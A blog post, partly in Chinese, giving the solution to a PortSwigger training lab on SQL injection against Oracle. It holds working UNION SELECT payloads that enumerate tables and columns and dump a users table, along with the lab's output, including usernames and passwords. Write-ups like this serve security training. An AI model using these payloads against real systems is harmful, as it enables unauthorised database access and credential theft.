---
layout: post
title: "SQL injection attack, listing the database contents on Oracle"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# SQL injection attack, listing the database contents on Oracle


```
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.
Hint

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

For more information, see our SQL injection cheat sheet.



本實驗室在產品類別過濾器中包含一個 SQL 注入漏洞。 查詢的結果會在應用程序的響應中返回，因此您可以使用 UNION 攻擊從其他表中檢索數據。

該應用程序具有登錄功能，並且數據庫包含一個保存用戶名和密碼的表。 您需要確定該表的名稱及其包含的列，然後檢索表的內容以獲得所有用戶的用戶名和密碼。

要解決實驗室問題，請以管理員用戶身份登錄。
暗示

在 Oracle 數據庫上，每個 SELECT 語句都必須指定一個表來選擇 FROM。 如果你的 UNION SELECT 攻擊沒有從表中查詢，你仍然需要包含 FROM 關鍵字，後跟一個有效的表名。

Oracle 上有一個名為 dual 的內置表，您可以將其用於此目的。 例如： UNION SELECT 'abc' FROM dual

有關更多信息，請參閱我們的 SQL 注入備忘單。
```

解法:
```
Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'+FROM+dual--

Use the following payload to retrieve the list of tables in the database:
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
Find the name of the table containing user credentials.

Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
Find the names of the columns containing usernames and passwords.

Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
Find the password for the administrator user, and use it to log in.



使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。

確定查詢返回的列數以及哪些列包含文本數據。驗證查詢是否返回兩列，這兩列都包含文本，在 category 參數中使用如下所示的有效負載：
'+UNION+SELECT+'abc','def'+FROM+dual--

使用以下負載來檢索數據庫中的表列表：
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
查找包含用戶憑據的表的名稱。

使用以下負載（替換錶名）來檢索表中列的詳細信息：
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
查找包含用戶名和密碼的列的名稱。

使用以下負載（替換錶名和列名）檢索所有用戶的用戶名和密碼：
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
找到管理員用戶的密碼，並使用它登錄。

```











GET
```
category=Gifts
```


因為是 Oracle 所以必須要 FROM 一個東西，如果表沒有可以用 dual

兩個欄位:
```
' UNION SELECT NULL,NULL FROM dual--
```


兩個欄位都是字串:
```
' UNION SELECT 'aaa','bbb' FROM dual--
```


version :
```
' UNION SELECT banner,'bbb' FROM v$version--
```
response:
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

查 all_tables 中所有 table_name: 
```
' UNION SELECT table_name,'bbb' FROM all_tables--
```

找到一個 USERS_XFENFO 表



從 all_tab_columns 中找 column_name  只要表名為 USERS_XFENFO
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XFENFO'--
```

找到表名為 USERS_XFENFO 有兩個欄位
```
USERNAME_ONRUDE
PASSWORD_UKMTVK
```

從USERS_XFENFO 找這兩個欄位資料
```
' UNION SELECT USERNAME_ONRUDE,PASSWORD_UKMTVK FROM USERS_XFENFO--
```

data
```
administrator
p6nmkv4ks0jmakxdmyqh



carlos
otn11xw08njkbogz99r2



wiener
hhvbsrimolrj21vp828s
```


登入成功。


